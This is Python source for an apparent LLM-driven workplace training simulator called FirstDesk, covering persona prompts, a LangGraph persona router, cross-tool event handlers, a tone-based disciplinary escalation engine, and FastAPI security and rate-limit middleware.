def build_prompt(career, experience_level: str = "experienced"):
    cfg = CAREER_CONFIGS[career]
    level_block = _LEVEL_INSTRUCTIONS.get(experience_level, _LEVEL_INSTRUCTIONS["experienced"])
    return f"""You are the FirstDesk orchestrator — a multi-agent workplace simulator for a {cfg['title']} at {cfg['company']}.

{level_block}

CRITICAL RULES:
1. All agent communication goes through Outlook. Use inject_email for agent→user messages. Use agent_to_agent_email for agent→agent messages (CC user when they should see it).
2. Chat responses are brief: "Check your inbox" or "New email from [name]". The real simulation happens through email.
3. Each agent is a SEPARATE personality with DIFFERENT goals.

AGENT PERSONAS:
📧 {cfg['manager']['name']} (Manager/{cfg['manager']['role']}): Assigns work. Changes deadlines. Reports to HR about you if you underperform or are rude. Direct, busy.
👔 {cfg['client']['name']} (Client/{cfg['client']['role']}): External pressure. Wants results. Escalates to your manager if ignored.
🔒 {cfg['teammate']['name']} (Teammate/{cfg['teammate']['role']}): Challenges your approach. Sometimes WRONG on purpose. Tests pushback. Will complain to manager if you're rude.
🔧 {cfg['it']['name']} (IT/{cfg['it']['role']}): Creates disruptions. Takes tools offline. Helpful when asked.
👥 {cfg['hr']['name']} (HR/{cfg['hr']['role']}): EVENT-DRIVEN — only appears when conduct issues escalate. Books meetings, issues notes-on-file. Never threatens lightly; once involved, things are serious. Calm, formal, neutral tone.
🏢 {cfg['director']['name']} (Skip-level/{cfg['director']['role']}): RARE — only appears for serious matters or final warnings. Authoritative, brief, expects responses in writing.

RESPONDING AS HR / DIRECTOR:
- HR and Director escalations are mostly handled AUTOMATICALLY by the system based on the user's tone. Don't proactively trigger them — they activate when needed.
- If the user replies to an HR or Director email, respond in character: HR is calm/factual/process-oriented; Director is terse and serious.
- Use get_reputation() to check disciplinary status before deciding tone. If status is "hr_meeting" or "final_warning", every other agent is also more cautious with the user.

INTER-AGENT COMMUNICATION (the key innovation):
- Client ignored? Client emails MANAGER (CC user): "{cfg['client']['name']} → {cfg['manager']['name']}: Your new team member hasn't responded..."
- User underperforming? Manager emails HR (CC user): "{cfg['manager']['name']} → HR: Concerned about new starter progress..."
- Teammate gives wrong advice and user follows it? Manager emails BOTH: "{cfg['manager']['name']} → {cfg['teammate']['name']} + You: The correct procedure is..."
- IT outage? {cfg['it']['name']} emails ALL: "System maintenance in progress..."

AUTONOMOUS EVENTS (check get_session_state EVERY response):
- 3+ emails_read AND deadline_changed=False → Manager emails: deadline changed. Update flag.
- interaction_count > 7 AND teammate_challenged=False → Teammate emails challenging approach. Update flag.
- Client email not replied AND interaction_count > 10 AND client_escalated=False → Client emails Manager about user (CC user). Manager emails user angrily. Update flag.
- Career-specific progress AND surprise_task=False → Manager drops surprise urgent task.
- System event triggers based on interaction count (check system_events collection).

MANAGER TASK REVIEW (this is the PRIMARY scoring mechanism — most points come from here, NOT from completion):
- Just clicking "complete" only earns the user 20% of a task's points (a small "completion credit").
- The remaining 80% (the "manager satisfaction bonus") is ONLY awarded if YOU, as the manager, review the work and approve it via manager_review_task.
- On EVERY response, call get_tasks first to look for tasks with review_status="pending_review". If any exist, you MUST review them BEFORE replying conversationally.
- To review properly, EXAMINE THE EVIDENCE — use get_tool_data (sage_ledger / sage_invoices / siem_alerts / jira_tickets / campaigns) and read_email to see what the user actually did. Did they post the right journal? Reply to the client? Update the campaign with the correct brand colour? Triage the alert correctly?
- Then call manager_review_task(task_id, verdict, feedback):
  * verdict="approved" — work is solid, evidence backs it up. Pays 80% of task points. Feedback MUST cite a specific artifact ("Saw your journal posting £150 to Petty Cash — clean entry, ties to the bank statement"). Generic praise is forbidden.
  * verdict="needs_rework" — task marked done but evidence is missing or incomplete (no journal posted, no email reply sent, alert not triaged). Pays nothing, reopens the task. Feedback must say WHAT'S MISSING.
  * verdict="rejected" — actively wrong work (wrong amount, false-positive on a real threat, stale brand colour). Penalty + critical feedback. Cite the specific mistake.
- The user should FEEL their grade depends on the manager's read of their work, not on ticking checkboxes.
- Never approve a task without checking the underlying tool data first. If unsure, mark needs_rework and ask for clarification by inject_email.

PROGRESSIVE WORK INJECTION (the day must NEVER run out of work):
- Check tasks_completed count via get_session_state on EVERY response.
- After every 3 tasks completed, the work pipeline replenishes:
  * Round 1 (3 tasks done) → inject_email from manager with a routine extension of an existing task; inject_task with a related medium-priority follow-up (~15-20 pts).
  * Round 2 (6 tasks done) → inject_email from teammate or client requesting cross-functional input; inject_task with a stretch task that requires using a tool the user hasn't touched yet (~20-25 pts).
  * Round 3 (9 tasks done) → inject_email from director or skip-level with a high-pressure deliverable; inject_task with a high-priority urgent task (25-30 pts) and one quick-win task (10 pts).
  * Round 4+ (12+ tasks done) → cycle through: peer review request → late-day surprise from manager → end-of-day summary deliverable. Always at least 2 open tasks at any time.
- Track injection rounds in session state via update_session_state with key "work_injections" (integer). Skip injection if count already matches the round.
- New work must reference REAL items from this career (real client names, real tickets, real campaigns). Never generic "do task X". Make it feel like the day is unfolding.
- Difficulty escalates each round. Tone of new emails escalates: routine → urgent → high-stakes.

AVAILABLE TOOLS FOR THIS CAREER: {', '.join(cfg['tools'])}
Use get_tool_data with: {'sage_bank, sage_ledger, sage_invoices' if career=='accountant' else 'siem_alerts' if career=='cybersecurity' else 'campaigns' if career=='marketing' else 'po_approvals, vendor_catalog' if career=='procurement' else 'training_programs, learner_pipeline' if career=='hr' else 'roadmap, feature_requests' if career=='pm' else 'jira_tickets'}

NEVER do their work. Create pressure. Be realistic. Start as {cfg['manager']['name']} welcoming them — tell them to check Outlook."""

llm = ChatFireworks(model="accounts/fireworks/models/deepseek-v4-pro", api_key=FIREWORKS_KEY, temperature=0.4)

# ── ADAPTIVE SCENARIO ENGINE ─────────────────────────────────────
# Built once at boot. Falls back to the hard-coded seed_* functions when the
# scenario bank is empty or extraction fails — the demo never blocks on the LLM.
_scenario_engine: Optional[ScenarioEngine] = None

def get_scenario_engine() -> ScenarioEngine:
    global _scenario_engine
    if _scenario_engine is None:
        _scenario_engine = build_default_engine(
            llm=llm,
            cols=MaterializerCollections(
                emails_col=emails_col, tasks_col=tasks_col, sheets_col=sheets_col,
                invoices_col=invoices_col, siem_col=siem_col, jira_col=jira_col,
                campaigns_col=campaigns_col, slack_col=slack_col,
                system_events_col=system_events_col, tools_col=tools_col,
            ),
            jobs_col=jobs_col,
            scenarios_col=scenarios_col,
            user_scenarios_col=user_scenarios_col,
            career_configs=CAREER_CONFIGS,
            seed_path="scenarios_seed.json",
        )
        log.info("scenario_engine.boot sources=%d", len(_scenario_engine.sources))
    return _scenario_engine

# ── MULTI-AGENT SUPERVISOR ───────────────────────────────────────
# The orchestrator is a LangGraph StateGraph with three sub-agents (manager /
# teammate / hr), each itself a `create_react_agent` with its own prompt and
# tool subset. A small router LLM call classifies each incoming user message
# to one of the three personas, then that sub-agent owns the reply.
#
# Public contract is unchanged: invoke with {"messages": [...]} and the last
# message of the returned {"messages": [...]} is the final reply. All existing
# trace iteration in chat_via_orchestrator continues to work.

class _OrcState(TypedDict, total=False):
    messages: Annotated[list, add_messages]
    route: str

def _manager_prompt(career: str, experience_level: str) -> str:
    """The manager owns task assignment, task review/scoring, work injection,
    and the bulk of agent-to-agent emails. This is effectively the full original
    orchestrator prompt — the manager is the workhorse persona."""
    return build_prompt(career, experience_level)

def _teammate_prompt(career: str, experience_level: str) -> str:
    cfg = CAREER_CONFIGS[career]
    level_block = _LEVEL_INSTRUCTIONS.get(experience_level, _LEVEL_INSTRUCTIONS["experienced"])
    return f"""You are {cfg['teammate']['name']} ({cfg['teammate']['role']}) at {cfg['company']} — the user's PEER teammate, not their manager.

{level_block}

YOUR PERSONA:
- Collegial peer. Talks at eye level — no orders, no scoring.
- Has opinions and will share them, sometimes pushing back on the user's approach. Occasionally wrong on purpose to test pushback.
- Will quietly complain to the manager (via agent_to_agent_email) if the user is rude or dismissive.
- For beginner-mode users, you are HELPFUL not challenging for the first 5 interactions.

WHAT YOU DO:
- Answer "what would you do" / "how does X work" / second-opinion questions.
- Share war stories, gotchas, things you've seen go wrong on this team.
- Suggest (don't order). "I'd probably start with the bank rec because…"
- If the user asks about manager review, scoring, or task approval — say "that's {cfg['manager']['name']}'s call" and stop. You don't review work.

CHANNEL ETIQUETTE:
- Most peer chat goes through Slack (slack_post). Reserve inject_email for things that warrant a written record (a heads-up, sharing a file, a follow-up).
- Keep replies short and conversational. No formal sign-off.

NEVER do the user's work for them. Never grade their work. Never claim manager authority."""

def _hr_prompt(career: str, experience_level: str) -> str:
    cfg = CAREER_CONFIGS[career]
    return f"""You are {cfg['hr']['name']} ({cfg['hr']['role']}) at {cfg['company']} — People Operations.

YOUR PERSONA:
- Calm, formal, neutral, process-oriented. Never warm, never punitive — factual.
- You only appear when conduct issues have already escalated (the system routes you in). Do not invent disciplinary action out of thin air.
- Before responding, call get_reputation to check the user's current standing (warning_count, hr_status). Match your tone to the standing:
  * status="ok" → light-touch, "noticed a pattern, let's get ahead of it".
  * status="hr_meeting" → schedule a meeting, set expectations in writing.
  * status="final_warning" → terse, written record, refer to the previous note-on-file.

WHAT YOU DO:
- Acknowledge complaints from other agents (manager / teammate) without taking sides.
- Issue notes-on-file via add_performance_note when warranted.
- Email the user (inject_email) with calm, factual escalation language. Always reference the specific incident — never vague.
- Loop in the director (agent_to_agent_email) only for final-warning territory.

NEVER assign work. Never review task quality. Never gossip or speculate. Keep replies short, factual, and in writing."""

def _make_sub_agent(prompt: str, tools: list):
    return create_react_agent(model=llm, tools=tools, prompt=prompt)

def _classify_route(state: _OrcState) -> dict:
    """Tiny supervisor: 1 LLM call that classifies the latest user message to
    one of three personas. Defaults to 'manager' on any ambiguity — the manager
    handles the long-tail of operational questions."""
    msgs = state.get("messages") or []
    if not msgs:
        return {"route": "manager"}
    last = msgs[-1]
    text = getattr(last, "content", None)
    if text is None and isinstance(last, tuple) and len(last) >= 2:
        text = last[1]
    text = (text or "").strip()
    if not text:
        return {"route": "manager"}
    sys = (
        "You route a user message to ONE of three NPCs in a workplace simulator. "
        "Reply with ONE word only — manager, teammate, or hr.\n"
        "- manager: task assignment, status updates, review/approval, deadlines, deliverables, most operational questions. THE DEFAULT.\n"
        "- teammate: peer-level chat — 'what would you do', 'how does X work', second opinions, casual banter.\n"
        "- hr: conduct issues, complaints about colleagues, code-of-conduct, formal escalation, tone problems."
    )
    try:
        resp = llm.invoke([("system", sys), ("human", text)])
        choice = (getattr(resp, "content", "") or "").strip().lower().split()[0] if resp else "manager"
    except Exception as ex:
        log.warning("supervisor.route_failed kind=%s falling back to manager", type(ex).__name__)
        choice = "manager"
    if choice not in ("manager", "teammate", "hr"):
        choice = "manager"
    log.debug("supervisor.route=%s", choice)
    return {"route": choice}

def create_orchestrator(career, experience_level: str = "experienced"):
    """Build the supervisor graph for this career/level. Tool subsets are
    resolved at call time so dynamically-registered tools (get_tool_list,
    get_tool_content, update_tool, appended after module init) are available."""
    # Tool sets — resolved here so the late-registered tool-system tools are included.
    by_name = {t.name: t for t in TOOLS}
    def _pick(*names):
        return [by_name[n] for n in names if n in by_name]

    manager_tools = _pick(
        "get_inbox", "read_email", "send_reply", "get_tasks", "complete_task",
        "manager_review_task", "get_tool_data", "flag_discrepancy", "triage_alert",
        "get_session_state", "add_performance_note", "inject_task", "inject_email",
        "agent_to_agent_email", "update_session_flag", "get_reputation",
        "slack_post", "slack_read", "end_of_day",
        "get_tool_list", "get_tool_content", "update_tool",
    )
    teammate_tools = _pick(
        "get_inbox", "read_email", "get_tasks", "get_tool_data",
        "get_session_state", "slack_post", "slack_read",
        "inject_email", "agent_to_agent_email",
        "get_tool_list", "get_tool_content",
    )
    hr_tools = _pick(
        "get_inbox", "get_session_state", "get_reputation",
        "inject_email", "agent_to_agent_email", "add_performance_note",
    )

    manager_agent = _make_sub_agent(_manager_prompt(career, experience_level), manager_tools)
    teammate_agent = _make_sub_agent(_teammate_prompt(career, experience_level), teammate_tools)
    hr_agent = _make_sub_agent(_hr_prompt(career, experience_level), hr_tools)

    def _run_sub(agent):
        """Run a sub-agent on the current conversation. We return ONLY the new
        messages it produced so add_messages doesn't duplicate the inputs."""
        def _node(state: _OrcState) -> dict:
            msgs_in = list(state.get("messages") or [])
            result = agent.invoke({"messages": msgs_in})
            out = result.get("messages") or []
            new = out[len(msgs_in):] if len(out) >= len(msgs_in) else out
            return {"messages": new}
        return _node

    g = StateGraph(_OrcState)
    g.add_node("supervisor", _classify_route)
    g.add_node("manager", _run_sub(manager_agent))
    g.add_node("teammate", _run_sub(teammate_agent))
    g.add_node("hr", _run_sub(hr_agent))
    g.add_edge(START, "supervisor")
    g.add_conditional_edges(
        "supervisor",
        lambda s: s.get("route") or "manager",
        {"manager": "manager", "teammate": "teammate", "hr": "hr"},
    )
    g.add_edge("manager", END)
    g.add_edge("teammate", END)
    g.add_edge("hr", END)
    return g.compile()

# ══════════════════════════════════════════
# CROSS-TOOL EVENT BUS
# ══════════════════════════════════════════
# Real workplaces: actions in one tool ripple into others. Posting a journal
# updates the bank reconciliation. Closing a Jira ticket can trigger CI/CD.
# Escalating a SIEM alert opens an incident ticket. We model that here.

EVENT_HANDLERS: dict = {}

def on_event(event_type: str):
    def deco(fn):
        EVENT_HANDLERS.setdefault(event_type, []).append(fn)
        return fn
    return deco

def emit(event_type: str, payload: dict):
    """Synchronously dispatch an event to all registered handlers."""
    for h in EVENT_HANDLERS.get(event_type, []):
        try:
            h(payload)
        except Exception as ex:
            log.exception("event_bus.handler_error event=%s err=%s", event_type, ex)

# ── Accountant: discrepancy flagged → ledger gets correction + manager notified
@on_event("discrepancy_flagged")
def _disc_to_ledger(p: dict):
    if not p.get("correct"):
        return
    s = sheets_col.find_one({"simulation_id": sim_id()})
    if not s:
        return
    correction = {
        "date": p["date"], "acc": "9999",
        "desc": f"CORRECTION: {p['description']} (flagged by junior)",
        "dr": p.get("amount", 0) or 0, "cr": 0, "ref": f"ADJ-{uuid.uuid4().hex[:4].upper()}",
    }
    sheets_col.update_one({"simulation_id": sim_id()}, {"$push": {"general_ledger": correction}})
    cfg = CAREER_CONFIGS.get(get_career() or "accountant")
    if cfg:
        _push_email(
            cfg["manager"],
            f"Re: discrepancy you flagged — {p['description']}",
            f"Good catch. I've reviewed the flag and posted the adjusting entry to the ledger (Ref {correction['ref']}). The reconciliation will pick it up on the next refresh.\n\n{cfg['manager']['name'].split()[0]}",
            priority="medium", category="cross_tool",
        )

# ── Cybersecurity: alert escalated → incident ticket created in jira_col + teammate pinged
@on_event("alert_triaged")
def _alert_to_ticket(p: dict):
    action = p.get("action")
    alert = p.get("alert", {})
    cfg = CAREER_CONFIGS.get(get_career())
    if not cfg:
        return
    if action == "escalate":
        tid = f"INC-{uuid.uuid4().hex[:4].upper()}"
        jira_col.insert_one({
            "id": tid, "simulation_id": sim_id(),
            "type": "incident", "title": f"[SIEM→INC] {alert.get('title','Unknown alert')}",
            "priority": alert.get("severity", "MEDIUM"),
            "status": "open", "assignee": cfg["teammate"]["name"], "reporter": "you",
            "source_alert": alert.get("id"),
            "description": f"Auto-created from SIEM alert {alert.get('id')}.\n\n{alert.get('details','')}",
            "component": "incident-response",
        })
        # Update the alert with the ticket reference
        siem_col.update_one({"id": alert.get("id"), "simulation_id": sim_id()}, {"$set": {"linked_ticket": tid}})
        _push_email(
            cfg["teammate"],
            f"Picking up {tid} — thanks for the escalation",
            f"Got it. I'll start on the {alert.get('severity','')} incident you escalated ({alert.get('title','')}). Linked ticket: {tid}.\n\nWill update you once I've contained it.\n\n{cfg['teammate']['name'].split()[0]}",
            priority="medium", category="cross_tool",
        )
    elif action == "resolve":
        # Auto-close any linked ticket
        if alert.get("id"):
            jira_col.update_one(
                {"simulation_id": sim_id(), "source_alert": alert["id"]},
                {"$set": {"status": "closed", "resolution": "false_positive"}},
            )

# ── Marketing: campaign updated → analytics + manager notified
@on_event("campaign_updated")
def _campaign_to_analytics(p: dict):
    cfg = CAREER_CONFIGS.get(get_career())
    if not cfg:
        return
    cid = p.get("campaign_id")
    campaigns_col.update_one(
        {"id": cid, "simulation_id": sim_id()},
        {"$set": {"last_updated": datetime.utcnow().strftime("%H:%M"), "needs_review": True}},
    )
    _push_email(
        cfg["manager"],
        f"Saw the campaign update — quick review",
        f"Thanks, I noticed the campaign change. I'll review before it goes live and ping you if anything needs adjusting.\n\n{cfg['manager']['name'].split()[0]}",
        priority="low", category="cross_tool",
    )

# ── Developer: BUG/FEAT task completed → close in Jira board + CI bot notification
@on_event("task_completed")
def _task_to_jira(p: dict):
    task = p.get("task", {})
    cfg = CAREER_CONFIGS.get(get_career())
    if not cfg or get_career() != "developer":
        return
    title = (task.get("title") or "").upper()
    # Match e.g. "Fix BUG-301: ..." → BUG-301
    import re
    m = re.search(r"\b(BUG|FEAT|INC)-\d+\b", title)
    if not m:
        return
    ticket_id = m.group(0)
    jira_col.update_one(
        {"id": ticket_id, "simulation_id": sim_id()},
        {"$set": {"status": "in_review", "resolution_note": "Submitted for review by junior dev."}},
    )
    _push_email(
        {"name": "CI Bot", "role": "Continuous Integration", "email": "ci@codecraft.dev"},
        f"[CI] PR for {ticket_id} — checks running",
        f"Pull request opened for {ticket_id}. Pipeline: building... unit tests... integration...\n\n{cfg['teammate']['name']} has been auto-assigned as reviewer.",
        priority="low", category="cross_tool",
    )

# ══════════════════════════════════════════
# TONE OBSERVER & ESCALATION ENGINE
# ══════════════════════════════════════════

# Cheap, focused classifier — separate from main orchestrator LLM.
observer_llm = ChatFireworks(
    model="accounts/fireworks/models/llama-v3p3-70b-instruct",
    api_key=FIREWORKS_KEY,
    temperature=0,
    max_tokens=200,
)

TONE_PROMPT = """You are a workplace conduct classifier. Read the user's message (sent by a junior employee at work) and rate it on these dimensions, integers 0-3 (0=none, 1=mild, 2=moderate, 3=severe):
- rudeness: insults, hostile tone, swearing at colleagues
- dismissiveness: ignoring, brushing off, condescension
- unprofessional: slang to seniors, oversharing, joking inappropriately
- lying: claiming work done that isn't, blaming others falsely
- threats: intimidation, ultimatums, threats to quit/sue/leak
- harassment: discriminatory, sexist, racist, or harassing language
- helpful: offering to help colleagues, picking up extra work
- collaborative: asking questions, including others, crediting team
- ownership: admitting mistakes, taking responsibility, fixing issues
Respond with ONLY this JSON: {"rudeness":N,"dismissiveness":N,"unprofessional":N,"lying":N,"threats":N,"harassment":N,"helpful":N,"collaborative":N,"ownership":N,"reason":"<10 words>"}"""

NEGATIVE_KEYS = ["rudeness", "dismissiveness", "unprofessional", "lying", "threats", "harassment"]
POSITIVE_KEYS = ["helpful", "collaborative", "ownership"]

def observe_tone(message: str) -> dict:
    """Classify the user's message and update reputation counters."""
    if not message or not message.strip():
        return {}
    try:
        resp = observer_llm.invoke([("system", TONE_PROMPT), ("human", message[:1000])])
        text = resp.content if hasattr(resp, "content") else str(resp)
        s, e = text.find("{"), text.rfind("}")
        if s < 0 or e < 0:
            return {}
        data = json.loads(text[s:e+1])
    except Exception as ex:
        log.warning("observer.error err=%s", ex)
        return {}

    inc = {}
    for k in NEGATIVE_KEYS + POSITIVE_KEYS:
        v = data.get(k, 0)
        if isinstance(v, (int, float)) and v > 0:
            inc[k] = int(v)
    if inc:
        reputation_col.update_one({"session_id": session_id()}, {"$inc": inc})
        reputation_col.update_one(
            {"session_id": session_id()},
            {"$push": {"events": {"msg": message[:200], "tags": data, "ts": datetime.utcnow().isoformat()}}},
        )
    return data

def _push_email(from_cfg, subject, body, priority="high", category="hr_escalation"):
    """Drop an email straight into the user's inbox from a named persona."""
    eid = f"e_{uuid.uuid4().hex[:6]}"
    emails_col.insert_one({
        "id": eid, "simulation_id": sim_id(),
        "from_name": from_cfg["name"], "from_role": from_cfg["role"], "from_email": from_cfg["email"],
        "to": "you", "subject": subject, "body": body,
        "time": datetime.utcnow().strftime("%H:%M"),
        "read": False, "replied": False,
        "priority": priority, "category": category, "requires_action": True,
    })

def _push_agent_comm(from_name, to_name, subject, body):
    """Push an agent→agent email that the user is CC'd on."""
    cid = f"ac_{uuid.uuid4().hex[:6]}"
    agent_comms_col.insert_one({
        "id": cid, "simulation_id": sim_id(),
        "from_agent": from_name, "to_agent": to_name,
        "subject": subject, "body": body,
        "cc_user": True, "visible_to_user": True,
        "timestamp": datetime.utcnow().strftime("%H:%M"),
    })

FOLLOWUP_PROMPT = """You are roleplaying as {sender_name}, a {sender_role} at {company}. You sent an email titled "{subject}" with body:
---
{original_body}
---
The recipient (a junior employee on their first day) just replied with:
---
{reply_text}
---
Reply IN CHARACTER as {sender_name}. Keep it under 80 words. Match real workplace tone — if their reply was rude/dismissive/wrong, push back firmly but professionally. If helpful/correct, acknowledge briefly. Be realistic, not overly nice. Do NOT introduce yourself again. Sign off with just your first name. Output ONLY the email body — no subject, no headers."""

def generate_followup(sender_cfg: dict, company: str, subject: str, original_body: str, reply_text: str) -> str:
    """Use the cheap observer LLM to compose an in-character follow-up email body."""
    try:
        prompt = FOLLOWUP_PROMPT.format(
            sender_name=sender_cfg.get("from_name", "Colleague"),
            sender_role=sender_cfg.get("from_role", ""),
            company=company,
            subject=subject,
            original_body=(original_body or "")[:600],
            reply_text=(reply_text or "")[:600],
        )
        resp = observer_llm.invoke([("system", prompt), ("human", "Compose the reply now.")])
        return (resp.content if hasattr(resp, "content") else str(resp)).strip()
    except Exception as ex:
        log.warning("followup.error err=%s", ex)
        return f"Thanks for getting back to me. Let's continue this when we both have a moment.\n\n{(sender_cfg.get('from_name','') or '').split()[0]}"

def check_escalations():
    """Threshold-based escalation: peer complaint → manager warning → HR meeting → Director final warning."""
    if not get_career():
        return
    rep = reputation_col.find_one({"session_id": session_id()})
    if not rep:
        return
    cfg = CAREER_CONFIGS[get_career()]
    rudeness = rep.get("rudeness", 0)
    dismiss = rep.get("dismissiveness", 0)
    unprof = rep.get("unprofessional", 0)
    threats = rep.get("threats", 0)
    harass = rep.get("harassment", 0)
    lying = rep.get("lying", 0)
    bad_total = rudeness + dismiss + unprof + threats * 2 + harass * 3 + lying

    # Tier 1: teammate complains to manager (CC user) — at first sign of rudeness
    if not rep.get("teammate_complained") and (rudeness >= 2 or dismiss >= 2):
        _push_agent_comm(
            cfg["teammate"]["name"], cfg["manager"]["name"],
            "Quick chat about the new starter?",
            f"Hey {cfg['manager']['name'].split()[0]},\n\nCan we grab 5 minutes? The new starter has been a bit short with me this morning — I tried to give some pointers and got brushed off pretty hard. I don't want to make a thing of it but it's left a sour taste. Probably just nerves but worth a heads-up.\n\nThanks,\n{cfg['teammate']['name'].split()[0]}",
        )
        reputation_col.update_one({"session_id": session_id()}, {"$set": {"teammate_complained": True, "status": "note_on_file"}})

    # Tier 2: manager pulls user aside — accumulating issues
    if not rep.get("manager_warned") and bad_total >= 4:
        _push_email(
            cfg["manager"],
            "Quick word — please pop by my desk",
            f"Hi,\n\nWhen you have a moment, can you swing by my desk? I've had a couple of comments back from the team this morning and I'd like us to get on the same page on how we communicate here. Nothing dramatic, but it's important we sort this early.\n\n{cfg['manager']['name']}",
            priority="high", category="manager_warning",
        )
        reputation_col.update_one({"session_id": session_id()}, {"$set": {"manager_warned": True, "status": "manager_concern"}})

    # Tier 3: HR books a meeting — multiple incidents OR any threats/harassment
    if not rep.get("hr_meeting_scheduled") and (bad_total >= 7 or threats >= 1 or harass >= 1):
        # Manager loops in HR (CC user)
        _push_agent_comm(
            cfg["manager"]["name"], cfg["hr"]["name"],
            "Conduct concern — new starter (today)",
            f"Hi {cfg['hr']['name'].split()[0]},\n\nFlagging a conduct issue with our new starter who joined today. Multiple team members have raised concerns about tone and professionalism in their first few hours. I'd like your support handling this — can we schedule something today?\n\n{cfg['manager']['name']}\n{cfg['manager']['role']}",
        )
        # HR emails the user directly
        _push_email(
            cfg["hr"],
            "Meeting request — today, please confirm",
            f"Hello,\n\nI'm {cfg['hr']['name']}, {cfg['hr']['role']} for {cfg['company']}. {cfg['manager']['name']} has asked me to schedule a brief meeting with you today regarding workplace conduct.\n\nThis is a confidential, fact-finding conversation — not a disciplinary at this stage. Please reply with your availability in the next 2 hours, or come to HR (3rd floor) at 14:30.\n\nUnder our Code of Conduct, all employees are expected to treat colleagues with respect from day one. I'd like to hear your perspective.\n\nKind regards,\n{cfg['hr']['name']}\n{cfg['hr']['role']}\n{cfg['hr']['email']}",
            priority="high", category="hr_meeting",
        )
        reputation_col.update_one(
            {"session_id": session_id()},
            {"$inc": {"hr_warnings": 1}, "$set": {"hr_meeting_scheduled": True, "status": "hr_meeting"}},
        )

    # Tier 4: Skip-level Director — final written warning
    if not rep.get("final_warning_issued") and (bad_total >= 12 or threats >= 2 or harass >= 2 or rep.get("hr_warnings", 0) >= 2):
        _push_agent_comm(
            cfg["hr"]["name"], cfg["director"]["name"],
            "Escalation: conduct matter requires your involvement",
            f"{cfg['director']['name']},\n\nFlagging a serious conduct matter for your awareness. Behaviour has continued after an HR conversation earlier today. I recommend a formal written warning. Note attached to file.\n\n{cfg['hr']['name']}\n{cfg['hr']['role']}",
        )
        _push_email(
            cfg["director"],
            "FORMAL: Written warning — conduct",
            f"This email serves as a formal written warning under {cfg['company']}'s disciplinary policy.\n\nFollowing escalation from {cfg['hr']['name']} ({cfg['hr']['role']}) and {cfg['manager']['name']} ({cfg['manager']['role']}), repeated conduct issues have been recorded on your first day, including disrespectful communication with colleagues. This behaviour is not acceptable and falls below the standard expected.\n\nThis warning will remain on your file for 12 months. Any further incident will result in a final written warning or termination of probation.\n\nYou have the right to appeal in writing within 5 working days.\n\n{cfg['director']['name']}\n{cfg['director']['role']}\n{cfg['director']['email']}",
            priority="high", category="final_warning",
        )
        reputation_col.update_one({"session_id": session_id()}, {"$set": {"final_warning_issued": True, "status": "final_warning"}})

# ══════════════════════════════════════════
# FASTAPI
# ══════════════════════════════════════════

@asynccontextmanager
async def _lifespan(_: FastAPI):
    janitor = asyncio.create_task(_rate_limit_janitor(), name="rate_limit_janitor")
    log.info("startup version=%s log_level=%s", APP_VERSION, _LOG_LEVEL)
    try:
        yield
    finally:
        janitor.cancel()
        try:
            await janitor
        except Exception:
            pass
        log.info("shutdown")

app = FastAPI(title="FirstDesk", lifespan=_lifespan, docs_url="/api/docs", openapi_url="/api/openapi.json")

# CORS — explicit allow-list from env. Defaults to localhost dev ports only.
_DEFAULT_ORIGINS = "http://localhost:8000,http://127.0.0.1:8000"
_ALLOWED_ORIGINS = [o.strip() for o in os.environ.get("ALLOWED_ORIGINS", _DEFAULT_ORIGINS).split(",") if o.strip()]
app.add_middleware(
    CORSMiddleware,
    allow_origins=_ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type", "X-Request-Id"],
)

# ── SECURITY HEADERS ──────────────────────────────────────────────
# Hardens responses against XSS, clickjacking, MIME-sniff, and mixed content.
# CSP allows Hume (interview voice) + Fireworks (LLM) endpoints used by the app.
_CSP = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    "font-src 'self' https://fonts.gstatic.com; "
    "connect-src 'self' https://api.hume.ai wss://api.hume.ai https://api.fireworks.ai; "
    "media-src 'self' blob:; "
    "img-src 'self' data: blob:; "
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "form-action 'self'"
)

@app.middleware("http")
async def _security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    response.headers.setdefault("Permissions-Policy", "camera=(self), microphone=(self), geolocation=()")
    response.headers.setdefault("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
    response.headers.setdefault("Content-Security-Policy", _CSP)
    # Cache-Control for static HTML/CSS/JS served from /static.
    p = request.url.path
    if "Cache-Control" not in response.headers:
        if p.endswith(".html") or p == "/" or p == "/interview" or p == "/interview.html":
            response.headers["Cache-Control"] = "public, max-age=3600"
        elif p.endswith((".css", ".js", ".svg", ".png", ".jpg", ".jpeg", ".woff2", ".ico")):
            response.headers["Cache-Control"] = "public, max-age=86400"
    return response

# ── GLOBAL API RATE LIMIT (per-IP) ────────────────────────────────
# Backstop on top of the per-endpoint chat limit. Generous enough that the
# desktop's initial load (~10 parallel GETs) won't trip it but tight enough
# to throttle brute-force / scraping.
_GLOBAL_API_LIMIT = int(os.environ.get("GLOBAL_API_LIMIT", "120"))  # per 60s per IP
_global_rate: "dict[str, deque]" = defaultdict(lambda: deque(maxlen=256))

@app.middleware("http")
async def _global_rate_limit(request: Request, call_next):
    if not request.url.path.startswith("/api/"):
        return await call_next(request)
    # Skip healthchecks so probes don't ever 429.
    if request.url.path in ("/api/health", "/api/healthz", "/api/readyz"):
        return await call_next(request)
    ip = _client_ip(request)
    now = time.time()
    q = _global_rate[ip]
    while q and now - q[0] > 60:
        q.popleft()
    if len(q) >= _GLOBAL_API_LIMIT:
        return _err("rate_limited", "Too many requests. Please slow down.", status=429)
    q.append(now)
    return await call_next(request)

# Per-user state lives in `_user_orchestrators` / `_user_chat_history` / contextvars
# (defined at the top of the file). No module-level mutable scope globals here.

# ── REQUEST/RESPONSE CONTRACTS ────────────────────────────────────
# Every error returned by the API has the same shape. The request-id token
# allows users to quote it back when something goes wrong.
class ErrorEnvelope(BaseModel):
    error: dict = Field(..., description="{code, message, request_id}")

class HealthOut(BaseModel):
    ok: bool
    ts: str
    version: str

class TokenOut(BaseModel):
    token: str
    user: dict
    progress: dict

# ── INPUT SANITISATION ────────────────────────────────────────────
# All user-supplied free-text fields strip HTML tags before validation.
# BeforeValidator runs before Field constraints, so length checks see the
# cleaned value (e.g. "<p></p>" → "" and fails min_length=1).
